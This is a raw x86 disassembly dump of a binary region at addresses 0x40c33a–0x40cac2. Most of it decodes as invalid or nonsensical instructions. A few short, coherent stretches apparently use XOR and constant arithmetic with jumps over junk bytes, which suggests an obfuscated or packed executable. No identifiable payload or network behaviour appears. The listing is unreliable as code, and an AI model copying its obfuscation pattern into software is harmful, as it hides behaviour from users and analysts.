  40c33a:	ror    BYTE PTR [ecx],1
  40c33c:	mov    edi,0x282ef11e
  40c341:	repz mov edi,0x6e20eb99
  40c347:	outs   dx,DWORD PTR ds:[esi]
  40c348:	in     al,0xf1
  40c34a:	cdq    
  40c34b:	lock mov cl,dh
  40c34e:	xchg   ecx,eax
  40c34f:	lahf   
  40c350:	mov    cl,0x34
  40c352:	mov    al,fs:0x64004408
  40c358:	sub    ch,dh
  40c35a:	cmp    esi,DWORD PTR [ecx+ecx*8]
  40c35d:	push   edi
  40c35e:	push   edi
  40c35f:	ror    DWORD PTR [edx],1
  40c361:	cmp    dl,BYTE PTR [edx-0x37]
  40c364:	dec    edx
  40c365:	jns    0x40c324
  40c367:	add    ah,dl
  40c369:	dec    edx
  40c36a:	sub    ah,BYTE PTR [eax+edi*1]
  40c36d:	fmul   DWORD PTR [edi]
  40c36f:	jp     0x40c3b3
  40c371:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c372:	loop   0x40c3d9
  40c374:	cmp    cl,dh
  40c376:	or     DWORD PTR [edi+ebp*4],eax
  40c379:	push   edx
  40c37a:	sbb    eax,0x589caf79
  40c37f:	repnz inc edx
  40c381:	call   0x48cd88a9
  40c386:	and    BYTE PTR [edx+0x30a6f7da],ah
  40c38c:	ds dec esi
  40c38e:	adc    bl,BYTE PTR [edx+0x587d35b8]
  40c394:	add    DWORD PTR [ecx-0x41bb632f],edi
  40c39a:	fnstcw WORD PTR [ebx+0x37]
  40c39d:	aaa    
  40c39e:	mov    cl,0xb7
  40c3a0:	pop    esp
  40c3a1:	ja     0x40c413
  40c3a3:	jb     0x40c38c
  40c3a5:	pop    ds
  40c3a6:	ins    DWORD PTR es:[edi],dx
  40c3a7:	call   0xfead:0x9299e596
  40c3ae:	call   0x53d7:0xf5abf03a
  40c3b5:	arpl   WORD PTR [esi+0xb0a174a],ax
  40c3bb:	aaa    
  40c3bc:	(bad)  
  40c3be:	push   ss
  40c3bf:	pop    ss
  40c3c0:	fistp  WORD PTR fs:[ebx-0x53]
  40c3c4:	xor    ebx,ecx
  40c3c6:	lods   eax,DWORD PTR ds:[esi]
  40c3c7:	xchg   edx,eax
  40c3c8:	test   BYTE PTR [esi],dl
  40c3ca:	enter  0x7bba,0xf4
  40c3ce:	fs inc eax
  40c3d0:	call   0xdb340e60
  40c3d5:	leave  
  40c3d6:	out    0x52,al
  40c3d8:	jns    0x40c410
  40c3da:	fisttp QWORD PTR [edi+ebp*4-0x3ed64c7d]
  40c3e1:	xor    eax,0x2c77bdc
  40c3e6:	sbb    ecx,DWORD PTR [ebx+0x54b9fc45]
  40c3ec:	or     BYTE PTR [ecx+0x7],dl
  40c3ef:	xor    eax,ecx
  40c3f1:	mov    edx,0x32729b
  40c3f6:	add    eax,edx
  40c3f8:	mov    DWORD PTR [ebp+0x8],eax
  40c3fb:	mov    eax,DWORD PTR [ebp-0x18]
  40c3fe:	xor    eax,ecx
  40c400:	add    eax,edx
  40c402:	mov    edx,DWORD PTR [ebp+0x14]
  40c405:	imul   eax,DWORD PTR [edx]
  40c408:	mov    edx,DWORD PTR [ebp-0x4]
  40c40b:	xor    edx,ecx
  40c40d:	mov    ecx,DWORD PTR [ebp+0x8]
  40c410:	lea    ecx,[edx+ecx*1+0x32729b]
  40c417:	cmp    ecx,eax
  40c419:	je     0x40cbb9
  40c41f:	mov    edi,DWORD PTR [ebp-0x18]
  40c422:	mov    eax,DWORD PTR [ebp+0x8]
  40c425:	mov    edx,DWORD PTR [ebp+0x14]
  40c428:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40c42c:	mov    ecx,0x7510854
  40c431:	xor    edx,edx
  40c433:	xor    edi,ecx
  40c435:	jmp    0x40c698
  40c43a:	dec    ebp
  40c43b:	scas   al,BYTE PTR es:[edi]
  40c43c:	push   ss
  40c43d:	pop    ebx
  40c43e:	cmc    
  40c43f:	arpl   WORD PTR [ecx-0x58],si
  40c442:	pop    esi
  40c443:	clc    
  40c444:	push   ss
  40c445:	rol    DWORD PTR [eax+ecx*2-0x7deba44c],cl
  40c44c:	jle    0x40c4cc
  40c44e:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c452:	mov    WORD PTR [ecx],es
  40c454:	and    ebp,DWORD PTR [edx-0x12]
  40c457:	stos   DWORD PTR es:[edi],eax
  40c458:	mov    cl,BYTE PTR [ecx+0x4f268302]
  40c45e:	aad    0x9c
  40c460:	cmp    al,0xf4
  40c462:	mov    ebx,0xf89ba399
  40c467:	int3   
  40c468:	fisub  DWORD PTR [eax+eax*8-0x2991fadf]
  40c46f:	xor    BYTE PTR [ecx+0x29fa73c2],bl
  40c475:	std    
  40c476:	push   0x46
  40c478:	ret    
  40c479:	aam    0x74
  40c47b:	inc    edx
  40c47c:	mov    cs,ecx
  40c47e:	mov    bl,0x4
  40c480:	adc    al,0xc5
  40c482:	(bad)  
  40c483:	jo     0x40c42c
  40c485:	mov    esp,esi
  40c487:	mov    al,ds:0x91b4351
  40c48c:	test   ecx,ebp
  40c48e:	dec    ebx
  40c48f:	jbe    0x40c430
  40c491:	rol    BYTE PTR [esi],1
  40c493:	fdivr  QWORD PTR [esi]
  40c495:	add    al,0xcd
  40c497:	cmp    ecx,DWORD PTR [edi-0x5daa2c21]
  40c49d:	xor    eax,0x2cf89b1a
  40c4a2:	jle    0x40c435
  40c4a4:	cli    
  40c4a5:	push   esp
  40c4a6:	inc    ecx
  40c4a7:	jl     0x40c49a
  40c4a9:	mov    ebx,DWORD PTR [edi+0x4b]
  40c4ac:	inc    esi
  40c4ad:	cmp    al,0x54
  40c4af:	pop    esp
  40c4b0:	add    DWORD PTR [ecx],ecx
  40c4b2:	scas   eax,DWORD PTR es:[edi]
  40c4b3:	call   0xd3da:0x6790bd7f
  40c4ba:	mov    esi,0xc1ed94b7
  40c4bf:	sbb    eax,0x6015f7d2
  40c4c4:	sbb    esp,DWORD PTR [edx]
  40c4c6:	xchg   ecx,eax
  40c4c7:	jge    0x40c500
  40c4c9:	(bad)  
  40c4ca:	cmp    eax,0x3fb4ee92
  40c4cf:	cwde   
  40c4d0:	ficom  DWORD PTR [eax+0x2f8d7bd3]
  40c4d6:	or     al,0xc5
  40c4d8:	and    al,0x7f
  40c4da:	add    eax,0x3f858f0e
  40c4df:	(bad)  
  40c4e0:	les    ecx,FWORD PTR [esi]
  40c4e2:	xchg   esi,eax
  40c4e3:	aad    0x1d
  40c4e5:	rcr    DWORD PTR [ebx+0x41836c3b],cl
  40c4eb:	retf   
  40c4ec:	aaa    
  40c4ed:	rcl    bl,1
  40c4ef:	lods   eax,DWORD PTR ds:[esi]
  40c4f0:	(bad)  
  40c4f1:	neg    DWORD PTR [eax]
  40c4f3:	jno    0x40c56a
  40c4f5:	aam    0xe0
  40c4f7:	pushf  
  40c4f8:	mov    bl,0x13
  40c4fa:	sbb    ax,0x17e7
  40c4fe:	iret   
  40c4ff:	xchg   BYTE PTR [edi-0x2c],ah
  40c502:	and    DWORD PTR [ecx],0x3c
  40c505:	jecxz  0x40c57b
  40c507:	repz test DWORD PTR [ebx+0x5fedb63e],ebp
  40c50e:	pusha  
  40c50f:	jl     0x40c54c
  40c511:	inc    esp
  40c512:	sbb    eax,0x26ceb14a
  40c517:	jge    0x40c532
  40c519:	cmp    BYTE PTR [ebx],0x34
  40c51c:	inc    eax
  40c51d:	jp     0x40c4b8
  40c51f:	hlt    
  40c520:	cmp    cl,BYTE PTR [esi]
  40c522:	push   ecx
  40c523:	pushf  
  40c524:	fs ret 0xfa94
  40c528:	xor    al,0x83
  40c52a:	addr16 mov ebx,0x4da537be
  40c530:	int3   
  40c531:	sub    eax,0x748eb862
  40c536:	shl    DWORD PTR [edx+0xc4f0d84],1
  40c53c:	cmp    ebp,DWORD PTR [esi-0xb]
  40c53f:	rol    BYTE PTR [eax-0x2ff7267c],cl
  40c545:	xchg   esi,eax
  40c546:	fist   WORD PTR [ebx-0x5b]
  40c549:	in     eax,0x5f
  40c54b:	mov    cl,0xa1
  40c54d:	lods   al,BYTE PTR ds:[esi]
  40c54e:	nop
  40c54f:	das    
  40c550:	lods   eax,DWORD PTR ds:[esi]
  40c551:	not    DWORD PTR [ecx+eiz*1-0x2e]
  40c555:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c556:	sbb    al,0x16
  40c558:	rcl    BYTE PTR [edx],1
  40c55a:	add    BYTE PTR [edx+0x41],ch
  40c55d:	loopne 0x40c5a2
  40c55f:	dec    edx
  40c560:	cld    
  40c561:	mov    esi,0x8fbf8c3f
  40c566:	mov    edx,0xb8a7c8ed
  40c56b:	int    0xf6
  40c56d:	mov    esi,0x5d56d5ae
  40c572:	pop    ss
  40c573:	dec    esp
  40c574:	adc    BYTE PTR [eax+0x5e8e51af],bl
  40c57a:	fnsave [esi*4-0x51c09b88]
  40c581:	mov    dl,0x8a
  40c583:	or     ah,BYTE PTR [esp+edi*8-0x80]
  40c587:	bound  esp,QWORD PTR [ecx+0x62]
  40c58a:	in     eax,dx
  40c58b:	fnstenv [edi+0x633fe7c6]
  40c591:	out    dx,al
  40c592:	(bad)  
  40c593:	jmp    0xcd3ed00a
  40c598:	imul   ebp,esi,0x93d52b50
  40c59e:	pop    ds
  40c59f:	push   esp
  40c5a0:	pushf  
  40c5a1:	sahf   
  40c5a2:	lahf   
  40c5a3:	sub    al,0xbf
  40c5a5:	or     al,0x33
  40c5a7:	and    BYTE PTR [edi],dh
  40c5a9:	aad    0xd7
  40c5ab:	jnp    0x40c5d4
  40c5ad:	lock cmp BYTE PTR [eax+0x66],ch
  40c5b1:	movntq (bad),mm4
  40c5b2:	out    0xe2,eax
  40c5b4:	sbb    eax,0xccf442fb
  40c5b9:	cmp    al,0x97
  40c5bb:	sub    esi,DWORD PTR [ebx]
  40c5bd:	dec    esp
  40c5be:	js     0x40c583
  40c5c0:	ss mov ebp,0xb9e4bc92
  40c5c6:	xor    ah,BYTE PTR ds:0x41f4f113
  40c5cc:	sub    BYTE PTR [eax+0x7ea9cc1a],ah
  40c5d2:	xchg   esp,eax
  40c5d3:	pushf  
  40c5d4:	sub    BYTE PTR [edx+0x5517bfe0],ch
  40c5da:	jecxz  0x40c5b3
  40c5dc:	sub    eax,ebp
  40c5de:	xchg   edi,eax
  40c5df:	ds push ebp
  40c5e1:	sbb    DWORD PTR ds:0x6a55e894,esp
  40c5e7:	dec    esi
  40c5e8:	ins    BYTE PTR es:[edi],dx
  40c5e9:	sub    eax,0xc17fea4c
  40c5ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5ef:	shr    BYTE PTR [edx],cl
  40c5f1:	or     cl,bh
  40c5f3:	(bad)  
  40c5f4:	dec    eax
  40c5f5:	pop    ds
  40c5f6:	scas   al,BYTE PTR es:[edi]
  40c5f7:	xchg   ebx,eax
  40c5f8:	pop    ds
  40c5f9:	mov    ecx,0x7a968439
  40c5fe:	adc    al,0x29
  40c600:	fld    DWORD PTR [esi-0x1c]
  40c603:	mov    eax,ds:0xd858d458
  40c608:	xor    BYTE PTR [edi+0xaacf94c],cl
  40c60e:	lods   eax,DWORD PTR ds:[esi]
  40c60f:	jae    0x40c687
  40c611:	pop    eax
  40c612:	dec    edi
  40c613:	push   esp
  40c614:	xchg   esi,eax
  40c615:	test   al,0x86
  40c617:	mov    DWORD PTR [ebx+0x54],esi
  40c61a:	and    eax,0xc233664d
  40c61f:	ret    0xa909
  40c622:	inc    eax
  40c623:	pusha  
  40c624:	int    0x22
  40c626:	push   ebx
  40c627:	cli    
  40c628:	xchg   esi,eax
  40c629:	and    BYTE PTR [edx-0x4c],dh
  40c62c:	cwde   
  40c62d:	push   edx
  40c62e:	imul   eax,DWORD PTR [ecx+edx*2+0x56],0xffffffb8
  40c633:	mov    esi,esp
  40c635:	in     al,dx
  40c636:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c637:	scas   eax,DWORD PTR es:[edi]
  40c638:	ret    
  40c639:	iret   
  40c63a:	pop    esp
  40c63b:	dec    ebp
  40c63c:	mov    bh,BYTE PTR [ebx]
  40c63e:	pop    ds
  40c63f:	adc    eax,0x2b5c64ee
  40c644:	out    dx,eax
  40c645:	repz test DWORD PTR [edi+0x67346723],0x4dc8741
  40c650:	cwde   
  40c651:	mov    esp,0x8e8c1d3e
  40c656:	inc    ecx
  40c657:	xor    ch,BYTE PTR [edi+0x6f4b732f]
  40c65d:	repnz repnz add al,0x67
  40c661:	add    ebp,ebp
  40c663:	or     BYTE PTR [edi],dl
  40c665:	or     dh,ah
  40c667:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c668:	nop
  40c669:	daa    
  40c66a:	xchg   esp,eax
  40c66b:	scas   eax,DWORD PTR es:[edi]
  40c66c:	out    0xf8,eax
  40c66e:	(bad)  
  40c66f:	test   BYTE PTR [eax],0xe3
  40c672:	(bad)  
  40c673:	aad    0x9c
  40c675:	aam    0x76
  40c677:	xchg   dh,bl
  40c679:	hlt    
  40c67a:	dec    eax
  40c67b:	cs push esi
  40c67d:	fldz   
  40c67f:	mov    bl,0x10
  40c681:	add    eax,0xf984ca45
  40c686:	inc    esp
  40c687:	push   0xa608d918
  40c68c:	fstp   DWORD PTR ds:0x394ad0cb
  40c692:	lods   eax,DWORD PTR ss:[esi]
  40c694:	scas   al,BYTE PTR es:[edi]
  40c695:	pop    edx
  40c696:	dec    ebp
  40c697:	enter  0x9bbe,0x72
  40c69b:	xor    al,BYTE PTR [eax]
  40c69d:	add    edi,esi
  40c69f:	div    edi
  40c6a1:	mov    edx,DWORD PTR [ebp-0x4]
  40c6a4:	xor    edx,ecx
  40c6a6:	lea    eax,[edx+eax*1+0x32729b]
  40c6ad:	mov    edx,DWORD PTR [ebp+0x8]
  40c6b0:	mov    edi,DWORD PTR [ebp-0x24]
  40c6b3:	mov    DWORD PTR [edi+edx*4],eax
  40c6b6:	mov    eax,DWORD PTR [ebp-0x18]
  40c6b9:	mov    edx,DWORD PTR [ebp+0x8]
  40c6bc:	xor    eax,ecx
  40c6be:	lea    eax,[eax+edx*1+0x32729b]
  40c6c5:	mov    DWORD PTR [ebp+0x8],eax
  40c6c8:	mov    eax,DWORD PTR [ebp-0x18]
  40c6cb:	jmp    0x40c92e
  40c6d0:	leave  
  40c6d1:	adc    bl,ah
  40c6d3:	cmp    eax,0x10f1ede3
  40c6d8:	xor    BYTE PTR [ebp-0x6bb3653f],dl
  40c6de:	loopne 0x40c6e7
  40c6e0:	fiadd  WORD PTR [eax+0x7c387e7e]
  40c6e6:	jle    0x40c766
  40c6e8:	fpatan 
  40c6ea:	(bad)  
  40c6eb:	jb     0x40c6ba
  40c6ed:	mov    ds:0x9e69965e,eax
  40c6f2:	push   ds
  40c6f3:	call   0x14d1dfda
  40c6f8:	leave  
  40c6f9:	xor    ebx,esi
  40c6fb:	repz xlat BYTE PTR ds:[ebx]
  40c6fd:	or     eax,DWORD PTR [edi+0x47]
  40c700:	jbe    0x40c6a6
  40c702:	fwait
  40c703:	push   0xffffffb7
  40c705:	cmp    esi,ebx
  40c707:	push   edx
  40c708:	dec    edi
  40c709:	jo     0x40c705
  40c70b:	push   es
  40c70c:	sbb    ah,BYTE PTR [ecx-0x41]
  40c70f:	push   ecx
  40c710:	ins    BYTE PTR es:[edi],dx
  40c711:	push   ds
  40c712:	int    0x75
  40c714:	arpl   WORD PTR [esi+0x554c5c06],bp
  40c71a:	and    eax,0xcab05b61
  40c71f:	div    BYTE PTR [esi+ecx*4-0x35135d89]
  40c726:	ret    0x69f7
  40c729:	sub    BYTE PTR [ebp+0x736e1292],0xd4
  40c730:	(bad)  
  40c731:	aas    
  40c732:	lods   al,BYTE PTR ds:[esi]
  40c733:	mov    eax,0x71b6baeb
  40c738:	jns    0x40c74f
  40c73a:	mov    eax,0xf6a6c515
  40c73f:	aam    0x4f
  40c741:	adc    eax,0x733ca42f
  40c746:	cmp    DWORD PTR [esi],edx
  40c748:	adc    eax,0x29aa310a
  40c74d:	mov    eax,0xe2c717ee
  40c752:	(bad)  
  40c753:	pop    esi
  40c754:	xor    BYTE PTR [esi-0x29],ch
  40c757:	imul   edi,DWORD PTR [esi+ebx*4-0x56126e5d],0xffffffda
  40c75f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c760:	jp     0x40c7cb
  40c762:	xchg   ebp,eax
  40c763:	fcomp  st(5)
  40c765:	xchg   edx,eax
  40c766:	sub    BYTE PTR [ebx-0x18],bh
  40c769:	shr    BYTE PTR [esi],0x43
  40c76c:	jecxz  0x40c74b
  40c76e:	push   es
  40c76f:	lods   eax,DWORD PTR ds:[esi]
  40c770:	lahf   
  40c771:	xchg   ebp,eax
  40c772:	xchg   ebp,ecx
  40c774:	mov    edx,0xa67ad096
  40c779:	fsub   QWORD PTR [esi-0x4e3e5b4c]
  40c77f:	pop    ebx
  40c780:	(bad)  
  40c782:	rcl    eax,cl
  40c784:	cmp    ebp,DWORD PTR [edx+0x7f]
  40c787:	rcl    BYTE PTR ds:0x41f741c0,1
  40c78d:	mov    WORD PTR [ecx-0x56],es
  40c790:	femms  
  40c792:	mov    bl,0xac
  40c794:	lea    ebx,[eax]
  40c796:	lods   al,BYTE PTR ds:[esi]
  40c797:	outs   dx,BYTE PTR ds:[esi]
  40c798:	popf   
  40c799:	push   ebx
  40c79a:	fmul   st,st(3)
  40c79c:	imul   esi,DWORD PTR [edx+0x9],0x7f61ff64
  40c7a3:	out    dx,al
  40c7a4:	fmul   DWORD PTR [ecx-0x19bf53a6]
  40c7aa:	add    BYTE PTR [ecx+0x74],al
  40c7ad:	jge    0x40c79a
  40c7af:	dec    ecx
  40c7b0:	mov    esi,0x2a1b48b0
  40c7b5:	mov    esp,0xdc93458
  40c7ba:	sbb    BYTE PTR [ecx+ebp*8-0x54],0xc
  40c7bf:	jo     0x40c7ea
  40c7c1:	inc    ebx
  40c7c2:	clc    
  40c7c3:	and    al,0x69
  40c7c5:	pop    ds
  40c7c6:	lds    edx,FWORD PTR [esi]
  40c7c8:	(bad)  
  40c7ca:	dec    ebx
  40c7cb:	mov    edi,DWORD PTR [edx+0x7dd1afe5]
  40c7d1:	push   eax
  40c7d2:	xchg   edx,eax
  40c7d3:	pusha  
  40c7d4:	fisttp DWORD PTR [ebp-0x33]
  40c7d7:	adc    ecx,DWORD PTR [ebx+0x3e]
  40c7da:	enter  0xce9,0x5c
  40c7de:	outs   dx,DWORD PTR cs:[esi]
  40c7e0:	add    DWORD PTR [edx],ebp
  40c7e2:	sbb    ecx,DWORD PTR [esi]
  40c7e4:	fnstenv [esi]
  40c7e6:	dec    edx
  40c7e7:	ins    DWORD PTR es:[edi],dx
  40c7e8:	add    dh,bh
  40c7ea:	jbe    0x40c80d
  40c7ec:	mov    ecx,0x190a67b7
  40c7f1:	lea    ecx,[esp+eax*2-0x25]
  40c7f5:	pop    es
  40c7f6:	dec    edi
  40c7f7:	(bad)  
  40c7f8:	sub    cl,dh
  40c7fa:	pop    edx
  40c7fb:	sub    bh,0xee
  40c7fe:	cmp    bh,0x5b
  40c801:	in     eax,dx
  40c802:	in     al,dx
  40c803:	hlt    
  40c804:	dec    eax
  40c805:	rol    DWORD PTR [esi+0x30],cl
  40c808:	test   BYTE PTR [edi],ch
  40c80a:	popf   
  40c80b:	paddsw mm2,QWORD PTR [edx-0x7e0c5181]
  40c812:	(bad)  
  40c813:	xchg   edx,eax
  40c814:	in     eax,0x69
  40c816:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c817:	mov    ebp,esp
  40c819:	push   es
  40c81a:	dec    ebx
  40c81b:	pusha  
  40c81c:	lea    eax,[edx]
  40c81e:	iret   
  40c81f:	retf   
  40c820:	cmc    
  40c821:	cmp    DWORD PTR [ecx-0x3bd1dab],esi
  40c827:	mov    WORD PTR [edi+0x58f6c5b6],?
  40c82d:	enter  0xb8a6,0x3f
  40c831:	xor    al,0x41
  40c833:	jp     0x40c825
  40c835:	arpl   WORD PTR [ebx+0xb],bp
  40c838:	dec    esi
  40c839:	loopne 0x40c874
  40c83b:	mov    cl,0x91
  40c83d:	rcr    edi,cl
  40c83f:	adc    edx,DWORD PTR [ecx+ebp*2]
  40c842:	ins    BYTE PTR es:[edi],dx
  40c843:	jne    0x40c879
  40c845:	or     BYTE PTR [ecx-0x658945ec],dl
  40c84b:	ins    BYTE PTR es:[edi],dx
  40c84c:	jb     0x40c8be
  40c84e:	ins    DWORD PTR es:[edi],dx
  40c84f:	das    
  40c850:	retf   
  40c851:	fcomp  QWORD PTR [esi]
  40c853:	aam    0xc7
  40c855:	stos   BYTE PTR es:[edi],al
  40c856:	test   eax,0x4a3f425b
  40c85b:	adc    eax,0x37423af3
  40c860:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c861:	int    0xcb
  40c863:	mov    esp,0xa29ad435
  40c868:	or     cl,bh
  40c86a:	xor    ebx,0x5e
  40c86d:	push   0xefb2e48b
  40c872:	scas   eax,DWORD PTR es:[edi]
  40c873:	stc    
  40c874:	icebp  
  40c875:	sub    dl,BYTE PTR [ebp-0x7bf303bc]
  40c87b:	ds add eax,0xb310bc12
  40c881:	jge    0x40c849
  40c883:	xor    ebp,DWORD PTR [ebx+ebp*4-0x4d4d3ee0]
  40c88a:	pushf  
  40c88b:	xor    BYTE PTR [edx],ah
  40c88d:	lahf   
  40c88e:	(bad)
  40c891:	mov    BYTE PTR [ebx+0xca7d15],bl
  40c897:	es inc edx
  40c899:	cmp    eax,0xf28fcd25
  40c89e:	mov    bl,0xe5
  40c8a0:	pushf  
  40c8a1:	fcom   QWORD PTR [esp+esi*4-0x7feb2100]
  40c8a8:	mov    ecx,0xf92d78ec
  40c8ad:	pop    esi
  40c8ae:	dec    ecx
  40c8af:	outs   dx,BYTE PTR ds:[esi]
  40c8b0:	int3   
  40c8b1:	call   0x1d97:0xa3bdafc4
  40c8b8:	clc    
  40c8b9:	jns    0x40c8f6
  40c8bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c8bc:	inc    esi
  40c8bd:	dec    ecx
  40c8be:	mov    ds:0x91e216a1,eax
  40c8c3:	pop    edi
  40c8c4:	push   0xf5e6cd95
  40c8c9:	dec    edi
  40c8ca:	retf   0x8a85
  40c8cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c8ce:	and    eax,0xe8986b06
  40c8d3:	xor    ecx,DWORD PTR [ebp-0x2c5a940f]
  40c8d9:	push   cs
  40c8da:	out    0xa9,al
  40c8dc:	test   eax,0x5ef23d0f
  40c8e1:	adc    DWORD PTR [ecx],ebx
  40c8e3:	jp     0x40c91c
  40c8e5:	add    DWORD PTR ds:0xa3090ad2,eax
  40c8eb:	mov    al,0xa7
  40c8ed:	fwait
  40c8ee:	xor    eax,0xeae0ada2
  40c8f3:	jmp    0xcf56:0xa6f8d893
  40c8fa:	jmp    0x3c776f9f
  40c8ff:	jmp    0x9dd9:0x3b9c21a8
  40c906:	lds    ebp,FWORD PTR [edx-0x18]
  40c909:	add    BYTE PTR ss:[ebp-0x66],dh
  40c90d:	ror    DWORD PTR [ebx],1
  40c90f:	out    0x37,eax
  40c911:	cs jo  0x40c8fc
  40c914:	xchg   ecx,eax
  40c915:	add    eax,0x790b472c
  40c91b:	or     dh,0xec
  40c91e:	mov    esp,0x622a86fe
  40c923:	fist   WORD PTR [ecx]
  40c925:	jmp    0x1ac0d174
  40c92a:	dec    esp
  40c92b:	pop    ds
  40c92c:	inc    edx
  40c92d:	pop    ecx
  40c92e:	mov    edx,DWORD PTR [ebp+0x14]
  40c931:	xor    eax,ecx
  40c933:	jmp    0x40cb96
  40c938:	pop    es
  40c939:	mov    ah,0x6
  40c93b:	cwde   
  40c93c:	mov    ch,0xa8
  40c93e:	mov    eax,ds:0x31ca67b1
  40c943:	cmp    DWORD PTR [eax],edx
  40c945:	push   ds
  40c946:	cdq    
  40c947:	rcr    BYTE PTR [eax+0x387e7e8e],cl
  40c94d:	jl     0x40c9cd
  40c94f:	jle    0x40c95e
  40c951:	rol    DWORD PTR [edx-0x7c9c6b64],0xa0
  40c958:	jmp    0x4dd276cd
  40c95d:	lods   eax,DWORD PTR ds:[esi]
  40c95e:	and    eax,0xe1284164
  40c963:	jp     0x40c961
  40c965:	gs dec edx
  40c967:	iret   
  40c968:	dec    ebx
  40c969:	into   
  40c96a:	inc    BYTE PTR [edi]
  40c96c:	jo     0x40c986
  40c96e:	and    eax,0x80ed54e1
  40c973:	rcr    edx,0xa4
  40c976:	dec    ebp
  40c977:	int3   
  40c978:	xor    al,bl
  40c97a:	inc    edi
  40c97b:	dec    esp
  40c97c:	(bad)  
  40c97d:	jmp    0xc3b9:0x5d7ba54
  40c984:	mov    bl,0x3b
  40c986:	dec    ebx
  40c987:	in     eax,0x42
  40c989:	hlt    
  40c98a:	stc    
  40c98b:	stc    
  40c98c:	rcl    DWORD PTR [esi-0x620e60a2],cl
  40c992:	je     0x40c98a
  40c994:	addr16 daa 
  40c996:	daa    
  40c997:	mov    ecx,0x2a117547
  40c99c:	add    BYTE PTR [ecx+ebx*4+0x1f],cl
  40c9a0:	repnz mov bl,0x56
  40c9a3:	push   0xef4e7c7b
  40c9a8:	xchg   edx,eax
  40c9a9:	fild   QWORD PTR [eax+0x190fefd]
  40c9af:	push   edx
  40c9b0:	test   al,0xbe
  40c9b2:	(bad)  
  40c9b3:	jge    0x40c95e
  40c9b5:	or     al,0x19
  40c9b7:	test   BYTE PTR [edx+0xa5f299e],al
  40c9bd:	sub    dh,BYTE PTR [esi-0x1d29f70c]
  40c9c3:	icebp  
  40c9c4:	add    BYTE PTR [edx],dl
  40c9c6:	push   ds
  40c9c7:	sub    eax,0xbc112e
  40c9cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9cd:	in     al,dx
  40c9ce:	and    al,0x37
  40c9d0:	mov    dl,0xee
  40c9d2:	cs popf 
  40c9d4:	xor    ch,dl
  40c9d6:	ret    0x9bea
  40c9d9:	mov    bl,0xd0
  40c9db:	xchg   BYTE PTR [edx-0x39465c59],dl
  40c9e1:	popf   
  40c9e2:	lods   eax,DWORD PTR ds:[esi]
  40c9e3:	xchg   BYTE PTR [ebx],bh
  40c9e5:	jl     0x40c984
  40c9e7:	xchg   ebp,eax
  40c9e8:	pop    ecx
  40c9e9:	or     ch,ch
  40c9eb:	inc    ecx
  40c9ec:	outs   dx,BYTE PTR ds:[esi]
  40c9ed:	push   0xc6eee6db
  40c9f2:	sub    al,0x5f
  40c9f4:	jle    0x40c9a0
  40c9f6:	jne    0x40ca61
  40c9f8:	jae    0x40c982
  40c9fa:	adc    ebx,DWORD PTR [ebx-0x604fc0b3]
  40ca00:	fidiv  WORD PTR [ecx]
  40ca02:	mov    bl,0xf1
  40ca04:	fimul  DWORD PTR [edx+edx*4-0x7]
  40ca08:	jp     0x40ca08
  40ca0a:	pop    ds
  40ca0b:	test   eax,0x4989da9d
  40ca10:	fbstp  TBYTE PTR [eax-0x115d5077]
  40ca16:	outs   dx,BYTE PTR ds:[esi]
  40ca17:	dec    esp
  40ca18:	and    DWORD PTR [eax],0x8d225776
  40ca1e:	pusha  
  40ca1f:	fdivr  QWORD PTR [eax+0x3f6d0949]
  40ca25:	(bad)  
  40ca26:	pop    ds
  40ca27:	fistp  WORD PTR [ecx-0x61]
  40ca2a:	jp     0x40ca5a
  40ca2c:	sub    DWORD PTR [ebx-0x4da7cf16],esp
  40ca32:	dec    ebp
  40ca33:	or     BYTE PTR [edx],0xec
  40ca36:	(bad)  
  40ca37:	sub    ecx,edx
  40ca39:	cs leave 
  40ca3b:	push   ds
  40ca3c:	sub    dh,bl
  40ca3e:	sub    DWORD PTR [ecx],0x74049f1d
  40ca44:	aam    0x28
  40ca46:	test   al,0x9c
  40ca48:	adc    ah,bh
  40ca4a:	adc    ecx,DWORD PTR [edi]
  40ca4c:	loop   0x40ca17
  40ca4e:	add    DWORD PTR [ebx+0x57068bde],ecx
  40ca54:	(bad)  
  40ca55:	lea    eax,[esi+0x3d]
  40ca58:	outs   dx,DWORD PTR ds:[esi]
  40ca59:	(bad)  
  40ca5a:	adc    al,0x79
  40ca5c:	test   DWORD PTR [ebx+0x22e80451],esi
  40ca62:	mov    ds:0xd2515c24,eax
  40ca67:	mov    esi,0x91162d74
  40ca6c:	and    DWORD PTR [edx-0x73a1e2f3],eax
  40ca72:	mov    ebp,0x8539e4a5
  40ca77:	push   ecx
  40ca78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca79:	inc    dx
  40ca7b:	mov    ds:0xb4ae014f,al
  40ca80:	cs add dh,dh
  40ca83:	jl     0x40ca79
  40ca85:	adc    eax,0x504cc8cd
  40ca8a:	sbb    BYTE PTR [ecx+0x51],ch
  40ca8d:	js     0x40ca58
  40ca8f:	retf   0x8ce7
  40ca92:	mov    BYTE PTR [eax],ch
  40ca94:	xlat   BYTE PTR ds:[ebx]
  40ca95:	pop    ebx
  40ca96:	adc    BYTE PTR [ecx-0x66],ch
  40ca99:	pop    esp
  40ca9a:	xor    DWORD PTR [ecx+edi*1-0x421faf04],ecx
  40caa1:	add    al,0x34
  40caa3:	hlt    
  40caa4:	pop    ebx
  40caa5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40caa6:	das    
  40caa7:	jae    0x40cb02
  40caa9:	sub    al,0xf
  40caab:	ret    0x641b
  40caae:	retf   
  40caaf:	or     eax,0x2c39e9b4
  40cab4:	(bad)  
  40cab5:	test   eax,0x33f7bd6a
  40caba:	mov    ds:0xc1de9612,eax
  40cabf:	xchg   ebp,eax
  40cac0:	sti    
  40cac1:	inc    esp
  40cac2:	scas   eax,DWORD PTR es:[edi]
